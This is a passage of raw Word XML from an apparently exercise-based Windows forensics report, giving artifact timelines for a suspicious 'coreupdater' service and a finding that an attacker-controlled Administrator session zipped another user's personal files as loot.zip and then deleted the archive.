            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache: file key written (≈ first execution / presence)</w:t>
              <w:br/>
              <w:t>c:\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>coreupdater.exe SHA1=fd153c66386ca93ec9993d66a84d6f0d129a3a5c compiled=2010-04-14 22:06:53.0000000 app=Unassociated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser/20261025201808_Amcache_UnassociatedFileEntries.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\AppCompat\Programs\Amcache.hve</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:12.368432</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd, complementary batch)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store</w:t>
              <w:br/>
              <w:t>Program Execution | AppCompatFlags Compatibility Assistant Store | C:\Windows\System32\coreupdater.exe=(Binary data)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_complement/recmd_complement_F.csv#16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\NTUSER.DAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: resource usage (end of period)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>foreground read/written=618496/12288 background read/written=0/0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_AppResourceUseInfo_Output.csv#681</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: resource usage (end of period)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\cmd.exe</w:t>
              <w:br/>
              <w:t>foreground read/written=484352/0 background read/written=0/0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_AppResourceUseInfo_Output.csv#682</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>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C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: coreupdater | StartType: auto start | Account: LocalSystem | C:\Windows\System32\coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40866</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-013: Collection: Administrator opened mortysmith's personal files (SSN, Plans, Thoughts, Portal_gun.png), zipped them as loot.zip, then deleted the archive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artifact:$usnjrnl:$j</w:t>
              <w:br/>
              <w:t>artifact:jump lists (automatic)</w:t>
              <w:br/>
              <w:t>artifact:lnk files</w:t>
              <w:br/>
              <w:t>artifact:prefetch</w:t>
              <w:br/>
              <w:t>artifact:registry: bam/dam</w:t>
              <w:br/>
              <w:t>artifact:registry: recentdocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>collection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1005, T1560.001, T1070.004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:35.500078 → 2020-09-19 03:47:48.926185</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Within the RDP session of C137\Administrator (all artifacts in C:\Users\Administrator profile):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:45:34 Notepad opens C:\Users\mortysmith\Documents\My Social Security Number.txt (22 bytes): LNK Recent\My Social Security Number.lnk (USN FileCreate 03:45:34.66), Notepad jump list entry, NOTEPAD.EXE prefetch run 03:45:34.51.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:45:39 Notepad opens C:\Users\mortysmith\Documents\Plans.txt (141 bytes): LNK + jump list, prefetch run 03:45:39.88.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:45:53 Photos opens C:\Users\mortysmith\Documents\Portal_gun.png (130,678 bytes, has Zone.Identifier): LNK, Photos jump list, UserAssist Microsoft.Windows.Photos runs=1 03:45:53.49.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:46:15 USN: "My Social Security Number.zip" created in C:\Users\mortysmith\Documents (MFT entries 87445/87470, ~RF822ef7.TMP temp file pattern of Explorer's compressed-folder handler), 03:46:18.07 renamed to loot.zip (entry 87470); LNK Recent\loot.lnk created 03:46:18.13 (target size 131,041 bytes), RecentDocs .zip MRU 0 "loot.zip".</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:47:09.92 USN: loot.zip FileDelete|Close (entry 87470); no longer present in $MFT.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:47:39 Notepad opens C:\Users\mortysmith\Desktop\Thoughts.txt (7 bytes): LNK, jump list, RecentDocs, prefetch run 03:47:39.74; UserAssist notepad.exe runs=3 last 03:47:39.72; BAM -500 notepad.exe 03:47:48.93.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>NOTEPAD.EXE prefetch FilesLoaded references THOUGHTS.TXT, PLANS.TXT and MY SOCIAL SECURITY NUMBER.TXT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The domain Administrator session (attacker-controlled per F-006/F-008) browsed another user's profile, viewed sensitive personal data and staged it in a ZIP named "loot.zip" (size ~131 KB, consistent with Portal_gun.png + text files), which was deleted ~50 s later. The deletion suggests the archive was exfiltrated in-between (e.g. through the Meterpreter session to 203.78.103.109, or copied via the RDP clipboard/drive redirection) — exfiltration itself is not proven by these artifacts and must be checked in the network/SRUM data. Name "loot.zip" is a strong indicator of malicious intent rather than administrative activity.</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22:50:19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\My Social Security Number.txt</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\My Social Security Number.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:47:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\Plans.txt</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=141</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Plans.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 23:07:44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\Portal_gun.png</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=130678</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Portal_gun.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK) ; Target: accessed (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=131041</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\loot.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:47:17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Desktop\Thoughts.txt</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Thoughts.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:35.500078</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\My Social Security Number.txt</w:t>
              <w:br/>
              <w:t>Notepad 64-bit interactions=1 machine=desktop-sdn1rpt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261025191825_AutomaticDestinations.csv#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\9b9cdc69c1c24e2b.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.129513</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: RecentDocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened (RecentDocs)</w:t>
              <w:br/>
              <w:t>loot.zip</w:t>
              <w:br/>
              <w:t>lnk=loot.lnk mru=0 .zip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_RecentDocs.csv#14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.069334</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36776</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
